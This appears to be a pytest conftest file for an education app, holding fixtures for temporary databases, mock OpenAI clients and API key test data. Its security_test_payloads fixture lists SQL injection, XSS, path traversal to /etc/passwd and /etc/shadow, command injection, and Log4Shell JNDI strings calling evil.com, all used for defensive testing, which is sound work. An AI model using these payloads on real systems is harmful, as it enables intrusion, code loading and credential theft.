"""
Pytest Configuration and Shared Test Fixtures

Provides common fixtures, test configuration, and utilities
for the comprehensive NeuroBridge EDU test suite.
"""

import pytest
import asyncio
import tempfile
import shutil
import sqlite3
import os
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock
from fastapi.testclient import TestClient
from httpx import AsyncClient

# Import application components for testing
from main import app
from services.api_key_manager import APIKeyManager
from models.database.connection import get_database

# Test configuration
pytest_plugins = ["pytest_asyncio"]


# Async test configuration
@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture(scope="session")
def anyio_backend():
    """Configure anyio backend for async tests."""
    return "asyncio"


# Database fixtures
@pytest.fixture
def temp_database():
    """Create temporary database for testing"""
    temp_dir = tempfile.mkdtemp()
    db_path = Path(temp_dir) / "test.db"
    
    yield str(db_path)
    
    # Cleanup
    if db_path.exists():
        db_path.unlink()
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def clean_database():
    """Create clean database with no student tables (post-migration state)"""
    temp_dir = tempfile.mkdtemp()
    db_path = Path(temp_dir) / "clean_test.db"
    
    # Create database without student tables
    conn = sqlite3.connect(str(db_path))
    conn.execute("PRAGMA user_version = 4")  # Set to migrated version
    conn.commit()
    conn.close()
    
    yield str(db_path)
    
    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def legacy_database():
    """Create database with student tables (pre-migration state)"""
    temp_dir = tempfile.mkdtemp()
    db_path = Path(temp_dir) / "legacy_test.db"
    
    conn = sqlite3.connect(str(db_path))
    conn.execute("PRAGMA foreign_keys = ON")
    
    # Create legacy student tables
    conn.execute("""
        CREATE TABLE students (
            id INTEGER PRIMARY KEY,
            name TEXT NOT NULL,
            email TEXT UNIQUE NOT NULL,
            webhook_url TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    conn.execute("""
        CREATE TABLE send_logs (
            id INTEGER PRIMARY KEY,
            student_id INTEGER NOT NULL,
            summary_title TEXT,
            status TEXT DEFAULT 'pending',
            sent_at TIMESTAMP,
            error_message TEXT,
            FOREIGN KEY (student_id) REFERENCES students(id)
        )
    """)
    
    # Insert test data
    test_students = [
        ("Alice Johnson", "alice@example.com", "https://alice.webhook.com"),
        ("Bob Smith", "bob@example.com", "https://bob.webhook.com"),
        ("Carol Brown", "carol@example.com", "https://carol.webhook.com")
    ]
    
    for name, email, webhook in test_students:
        conn.execute("INSERT INTO students (name, email, webhook_url) VALUES (?, ?, ?)",
                    (name, email, webhook))
    
    # Insert test send logs
    for i in range(10):
        conn.execute("""
            INSERT INTO send_logs (student_id, summary_title, status) 
            VALUES (?, ?, ?)
        """, (i % 3 + 1, f"Test Summary {i}", "sent" if i % 2 == 0 else "pending"))
    
    conn.execute("PRAGMA user_version = 3")  # Pre-migration version
    conn.commit()
    conn.close()
    
    yield str(db_path)
    
    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)


# HTTP client fixtures
@pytest.fixture
def test_client():
    """Create FastAPI test client"""
    return TestClient(app)


@pytest.fixture
async def async_client():
    """Create async HTTP client for testing"""
    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client


# Mock fixtures for external services
@pytest.fixture
def mock_openai_client():
    """Create comprehensive mock OpenAI client"""
    client = AsyncMock()
    
    # Mock models endpoint
    models_mock = AsyncMock()
    models_mock.list.return_value = [
        {"id": "gpt-4-turbo-preview", "object": "model", "created": 1677610602, "owned_by": "openai"},
        {"id": "gpt-3.5-turbo", "object": "model", "created": 1677610602, "owned_by": "openai"},
        {"id": "whisper-1", "object": "model", "created": 1677610602, "owned_by": "openai"}
    ]
    client.models = models_mock
    
    # Mock transcription
    transcriptions_mock = AsyncMock()
    transcriptions_mock.create.return_value = MagicMock(
        text="This is a mock transcription result from the audio file."
    )
    client.audio = MagicMock()
    client.audio.transcriptions = transcriptions_mock
    
    # Mock chat completion
    completions_mock = AsyncMock()
    completions_mock.create.return_value = MagicMock(
        choices=[MagicMock(
            message=MagicMock(
                content="## Mock Summary\n\nThis is a mock AI-generated summary of the transcribed content.\n\n### Key Points\n- Point 1\n- Point 2\n- Point 3"
            )
        )]
    )
    client.chat = MagicMock()
    client.chat.completions = completions_mock
    
    return client


@pytest.fixture
def mock_api_key_manager():
    """Create mock API key manager"""
    manager = AsyncMock(spec=APIKeyManager)
    manager.is_initialized = True
    
    # Default mock behavior
    manager.store_api_key.return_value = "mock-key-id-123"
    manager.retrieve_api_key.return_value = "sk-mock123456789012345678901234567890"
    manager.list_api_keys.return_value = {}
    manager.delete_api_key.return_value = True
    manager.validate_api_key.return_value = True
    
    return manager


# API Key test data fixtures
@pytest.fixture
def valid_api_key_data():
    """Valid API key data for testing"""
    return {
        "provider": "openai",
        "api_key": "sk-test123456789012345678901234567890",
        "label": "Test API Key"
    }


@pytest.fixture
def invalid_api_key_data():
    """Invalid API key data for testing"""
    return {
        "provider": "openai",
        "api_key": "invalid-key-format",
        "label": "Invalid Test Key"
    }


@pytest.fixture
def mock_api_key():
    """Mock API key object"""
    return {
        "id": "mock-key-123",
        "provider": "openai",
        "label": "Mock API Key",
        "created_at": "2023-01-01T00:00:00Z",
        "last_used_at": None,
        "status": "active",
        "last_four_chars": "7890"
    }


# Environment and configuration fixtures
@pytest.fixture
def temp_env_vars():
    """Temporarily set environment variables for testing"""
    original_vars = {}
    test_vars = {
        "OPENAI_API_KEY": "sk-test123456789012345678901234567890",
        "DATABASE_PATH": ":memory:",
        "JWT_SECRET": "test-secret-key"
    }
    
    # Save original values and set test values
    for key, value in test_vars.items():
        original_vars[key] = os.getenv(key)
        os.environ[key] = value
    
    yield test_vars
    
    # Restore original values
    for key, original_value in original_vars.items():
        if original_value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = original_value


# Security testing fixtures
@pytest.fixture
def security_test_payloads():
    """Common security test payloads"""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "' UNION SELECT * FROM users --"
        ],
        "xss_payloads": [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(`xss`)'></iframe>"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "| ls -la",
            "& dir",
            "`whoami`"
        ],
        "ldap_injection": [
            "${jndi:ldap://evil.com/x}",
            "${jndi:rmi://evil.com/x}",
            "${jndi:dns://evil.com/x}"
        ]
    }


# Performance testing fixtures
@pytest.fixture
def performance_test_data():
    """Generate test data for performance testing"""
    def generate_data(count):
        return [
            {
                "provider": "openai",
                "api_key": f"sk-perf{i:04d}567890123456789012345678901",
                "label": f"Performance Test Key {i}"
            }
            for i in range(count)
        ]
    
    return generate_data


# Cleanup utilities
@pytest.fixture(autouse=True)
def cleanup_temp_files():
    """Automatically cleanup temporary files after each test"""
    temp_files = []
    temp_dirs = []
    
    yield temp_files, temp_dirs
    
    # Cleanup files
    for file_path in temp_files:
        try:
            if isinstance(file_path, (str, Path)) and Path(file_path).exists():
                Path(file_path).unlink()
        except Exception:
            pass
    
    # Cleanup directories
    for dir_path in temp_dirs:
        try:
            if isinstance(dir_path, (str, Path)) and Path(dir_path).exists():
                shutil.rmtree(dir_path, ignore_errors=True)
        except Exception:
            pass


# Test markers
def pytest_configure(config):
    """Configure custom pytest markers"""
    config.addinivalue_line(
        "markers", "integration: marks tests as integration tests (deselect with '-m \"not integration\"')"
    )
    config.addinivalue_line(
        "markers", "performance: marks tests as performance tests (deselect with '-m \"not performance\"')"
    )
    config.addinivalue_line(
        "markers", "security: marks tests as security tests"
    )
    config.addinivalue_line(
        "markers", "slow: marks tests as slow running (deselect with '-m \"not slow\"')"
    )


# Custom test utilities
class TestUtils:
    """Utility functions for testing"""
    
    @staticmethod
    def create_temp_audio_file(duration_ms=1000):
        """Create temporary audio file for testing"""
        import io
        import wave
        import struct
        import math
        
        # Generate simple sine wave
        sample_rate = 44100
        samples = int(sample_rate * duration_ms / 1000)
        
        buffer = io.BytesIO()
        with wave.open(buffer, 'wb') as wav_file:
            wav_file.setnchannels(1)  # Mono
            wav_file.setsampwidth(2)  # 16-bit
            wav_file.setframerate(sample_rate)
            
            for i in range(samples):
                # 440 Hz sine wave
                value = int(32767 * math.sin(2 * math.pi * 440 * i / sample_rate))
                wav_file.writeframes(struct.pack('<h', value))
        
        buffer.seek(0)
        return buffer.getvalue()
    
    @staticmethod
    def assert_api_response_structure(response_data, expected_keys):
        """Assert API response has expected structure"""
        assert isinstance(response_data, dict)
        assert "success" in response_data
        
        if response_data["success"]:
            assert "data" in response_data
            data = response_data["data"]
            
            for key in expected_keys:
                assert key in data, f"Expected key '{key}' not found in response data"
        else:
            assert "error" in response_data or "detail" in response_data
    
    @staticmethod
    def assert_database_table_empty(db_path, table_name):
        """Assert that a database table is empty or doesn't exist"""
        conn = sqlite3.connect(db_path)
        try:
            cursor = conn.cursor()
            
            # Check if table exists
            result = cursor.execute(
                "SELECT name FROM sqlite_master WHERE type='table' AND name=?",
                (table_name,)
            ).fetchone()
            
            if result:
                # Table exists, check if empty
                count = cursor.execute(f"SELECT COUNT(*) FROM {table_name}").fetchone()[0]
                assert count == 0, f"Table {table_name} is not empty (has {count} rows)"
            # If table doesn't exist, that's also acceptable
        finally:
            conn.close()


@pytest.fixture
def test_utils():
    """Provide test utilities"""
    return TestUtils()


# Async test helpers
class AsyncTestHelpers:
    """Helper functions for async testing"""
    
    @staticmethod
    async def wait_for_condition(condition_func, timeout=5.0, interval=0.1):
        """Wait for a condition to be true with timeout"""
        import time
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if await condition_func() if asyncio.iscoroutinefunction(condition_func) else condition_func():
                return True
            await asyncio.sleep(interval)
        
        return False
    
    @staticmethod
    async def run_with_timeout(coro, timeout=10.0):
        """Run coroutine with timeout"""
        return await asyncio.wait_for(coro, timeout=timeout)


@pytest.fixture
def async_helpers():
    """Provide async test helpers"""
    return AsyncTestHelpers()